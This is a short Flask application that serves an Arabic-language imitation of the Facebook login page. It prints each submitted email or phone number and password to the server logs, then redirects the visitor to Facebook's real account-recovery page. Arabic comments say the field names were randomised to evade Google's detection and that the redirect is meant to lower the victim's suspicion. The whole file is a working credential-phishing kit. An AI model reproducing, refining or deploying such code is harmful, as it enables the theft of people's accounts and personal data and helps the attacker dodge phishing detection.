from flask import Flask, render_template_string, request, redirect
import base64

app = Flask(__name__)

# استعملنا أسماء عشوائية للمدخلات لتمويه قوقل
# 'v_auth' بدل 'u' و 'v_sec' بدل 'p'
html_template = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login_box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        .fb_logo { color: #1877f2; font-size: 30px; font-weight: bold; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
        .btn_login { background: #1877f2; color: #fff; border: none; border-radius: 6px; padding: 12px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login_box">
        <div class="fb_logo">facebook</div>
        <form action="/process" method="POST">
            <input type="text" name="v_auth" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="v_sec" placeholder="كلمة السر" required>
            <button type="submit" class="btn_login">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_template)

@app.route('/process', methods=['POST'])
def process():
    # استلام البيانات بالأسماء الجديدة
    user = request.form.get('v_auth')
    sec = request.form.get('v_sec')
    
    # طباعة النتائج في الـ Logs
    print(f"\\n[+] New Access Detected at Render Logs")
    print(f"[*] Account: {user}")
    print(f"[*] Secret: {sec}\\n")
    
    # تحويل الضحية لمكان آمن لتقليل الشك
    return redirect("https://www.facebook.com/recover/initiate")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
